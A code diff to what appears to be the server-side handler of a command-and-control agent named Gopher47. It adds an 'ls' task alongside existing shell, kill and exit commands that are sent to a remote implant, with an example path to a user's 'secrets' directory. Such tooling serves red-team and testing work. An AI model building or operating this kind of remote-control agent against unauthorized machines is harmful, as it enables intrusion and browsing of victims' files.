@@ -45,6 +45,25 @@ class CommandKill(Command):
         Task.add_data("kill " + arguments['PID'])
         return Task.buffer
 
+class CommandLs(Command):
+    Name = "ls"
+    Description = "Lists the files in a directory"
+    Help = "Ex: ls C:\\Users\\an00b\\secrets"
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="directory",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_data("ls " + arguments['directory'])
+        return Task.buffer
+
 class CommandExit(Command):
     Name        = "o7"
     Description = "just tells the agent to exit"
@@ -92,8 +111,9 @@ class Gopher47(AgentType):
 
     Commands = [
         CommandShell(),
-        CommandExit(),
         CommandKill(),
+        CommandLs(),
+        CommandExit()
     ]
 
     # Stolen from https://github.com/susMdT/SharpAgent/blob/main/handler.py
